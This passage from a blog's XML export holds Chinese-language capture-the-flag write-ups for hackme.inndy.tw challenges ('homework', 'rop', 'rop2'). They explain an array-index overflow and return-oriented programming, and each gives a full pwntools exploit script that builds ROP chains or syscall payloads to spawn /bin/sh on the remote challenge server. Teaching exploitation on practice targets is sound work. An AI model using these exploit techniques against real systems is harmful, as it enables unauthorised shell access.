数组下标溢出原理：因为c语言不会检测数组下标，所以如果我们给数组一个超出它大小的下标，就会照成数组越界。如果是想数组中写入数据的话，就会造成数据写入到不属于数组的地方，或者说如果读取数据的话，就会读取到别的地方的数据。因为数组地址是自低往高增长，而栈的地址是自高向下降低，所以如果我们将数组下标根据栈内的空间的分布，设置为特定的值，就可以修改或者是查看我们想要查看的地址的值。比如将返回地址设置成我们想要调用函数的地址。 具体可以参考这篇博客 所以只要找到返回地址对应着数组的位置是什么，再通过edit功能将返回地址修改为system函数的地址来获取shell 数组在栈中的位置是0x34,和返回地址的距离是0x34+8所以输入的数组下标为14 exp: from pwn import* context.log_level=&quot;debug&quot; #p = process(&#39;./homework&#39;) p = remote(&#39;hackme.inndy.tw&#39;, 7701) p.recvuntil(&quot;What&#39;s your name?&quot;) p.sendline(&#39;aaaa&#39;) p.recvuntil(&quot; &gt; &quot;) p.sendline(&quot;1&quot;) p.recv() p.sendline(&quot;14&quot;) p.recvuntil(&quot;How many?&quot;) p.sendline(str(0x080485fb)) p.recv() p.sendline(&quot;0&quot;)#make program return to target function p.interactive()]]></content>
      <categories>
        <category>hackme.inndy_writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[rop 和 rop2 writeup]]></title>
    <url>%2F2018%2F05%2F09%2F2018-5-9-rop-%E5%92%8C-rop2-writeup%2F</url>
    <content type="text"><![CDATA[题目来源：国外的一个ctf平台hackme rophint: ROP buffer overflow防护机制： 拖到IDA反编译一下 可以看到有很多函数 ，不管是用到的还是没用的都有，说明它编译时用的是静态连接我们可以通过ROPgadget 来直接构造ropchain命令为 ROPgadget –binary rop –ropchain 栈的大小可以通过peda的pattern search 来找到先生成 长度为100的字符串 pattern create 100然后执行程序 栈的大小为12exp: from pwn import * from struct import pack sh = remote(&#39;hackme.inndy.tw&#39;,7704) junk = &#39;a&#39;*12 + &quot;BBBB&quot; # junk + ebp p = junk p += pack(&#39;&lt;I&#39;, 0x0806ecda) # pop edx ; ret p += pack(&#39;&lt;I&#39;, 0x080ea060) # @ .data p += pack(&#39;&lt;I&#39;, 0x080b8016) # pop eax ; ret p += &#39;/bin&#39; p += pack(&#39;&lt;I&#39;, 0x0805466b) # mov dword ptr [edx], eax ; ret p += pack(&#39;&lt;I&#39;, 0x0806ecda) # pop edx ; ret p += pack(&#39;&lt;I&#39;, 0x080ea064) # @ .data + 4 p += pack(&#39;&lt;I&#39;, 0x080b8016) # pop eax ; ret p += &#39;//sh&#39; p += pack(&#39;&lt;I&#39;, 0x0805466b) # mov dword ptr [edx], eax ; ret p += pack(&#39;&lt;I&#39;, 0x0806ecda) # pop edx ; ret p += pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8 p += pack(&#39;&lt;I&#39;, 0x080492d3) # xor eax, eax ; ret p += pack(&#39;&lt;I&#39;, 0x0805466b) # mov dword ptr [edx], eax ; ret p += pack(&#39;&lt;I&#39;, 0x080481c9) # pop ebx ; ret p += pack(&#39;&lt;I&#39;, 0x080ea060) # @ .data p += pack(&#39;&lt;I&#39;, 0x080de769) # pop ecx ; ret p += pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8 p += pack(&#39;&lt;I&#39;, 0x0806ecda) # pop edx ; ret p += pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8 p += pack(&#39;&lt;I&#39;, 0x080492d3) # xor eax, eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0806c943) # int 0x80 sh.sendline(p) sh.interactive() rop2hint：ROPgadget not working anymore说明不可以再通过ROPgadget来获取ropchain了检查下防护机制 只开启了NX 简单运行了一下程序： 程序要求你输入一串字符串 然后打印出了一堆东西 将程序拖到ida中，来一手f5大法 发现了syscall函数 ，查了一下发现程序中的syscall(4,1,&amp;v4,42) 和syscall(3,0,&amp;v1,1024) 分别调用了write()函数和read函数的系统调用 解题思路：将syscall中的第一个参数设置为execve()函数的调用号，第二个 参数设置为“/bin/sh”参数的地址 来执行execve()获取shell execve()函数的系统调用号 为0xb exp: from pwn import* p = remote(&#39;hackme.inndy.tw&#39;,7703) elf = ELF(&#39;./rop2&#39;) bss = elf.bss() syscall = elf.symbols[&#39;syscall&#39;] overflow = elf.symbols[&#39;overflow&#39;] p.recv() payload = &#39;a&#39;*0xC + &#39;bbbb&#39; + p32(syscall) + p32(overflow) # junk + target_address + return_address payload += p32(3) + p32(0) + p32(bss) + p32(8) #syscall(3,0,bss_add,8) p.send(payload) p.send(&quot;/bin/sh\x00&quot;) payload1 = &#39;a&#39;*0xc + &quot;BBBB&quot; + p32(syscall) payload1 += p32(overflow)+ p32(0xb) + p32(bss) + p32(0) + p32(0) #syscall(0xb,bss_add,0,0) = execve(&quot;bin/sh&quot;,0,0) p.send(payload1) p.interactive()]]></content>
      <categories>
        <category>hackme.inndy_writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
</search>
